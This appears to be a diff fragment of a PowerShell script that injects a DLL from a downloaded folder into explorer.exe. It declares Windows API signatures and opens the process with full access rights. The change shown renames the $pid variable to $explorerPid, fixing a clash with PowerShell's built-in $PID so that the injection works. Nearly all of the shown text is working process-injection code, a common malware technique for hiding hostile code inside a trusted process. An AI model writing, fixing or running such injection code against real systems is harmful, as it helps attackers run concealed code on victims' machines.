@@ -3,7 +3,7 @@ $path = "$env:LOCALAPPDATA\DownloadedFolder\COHERENT_GOGGLES.dll"
 
 # Get the process ID of explorer.exe
 $explorerProcess = Get-Process explorer | Select-Object -First 1
-$pid = $explorerProcess.Id
+$explorerPid = $explorerProcess.Id  # Renamed variable to avoid conflict with $PID
 
 # Define the necessary Windows API functions for DLL injection
 $signature = @"
@@ -33,7 +33,7 @@ $signature = @"
 Add-Type -MemberDefinition $signature -Namespace "WinAPI" -Name "DllInjection"
 
 # Open the target process with necessary permissions
-$processHandle = [WinAPI.DllInjection]::OpenProcess(0x001F0FFF, $false, $pid)
+$processHandle = [WinAPI.DllInjection]::OpenProcess(0x001F0FFF, $false, $explorerPid)
 
 if ($processHandle -eq [IntPtr]::Zero) {
     Write-Error "Failed to open process. Exiting."
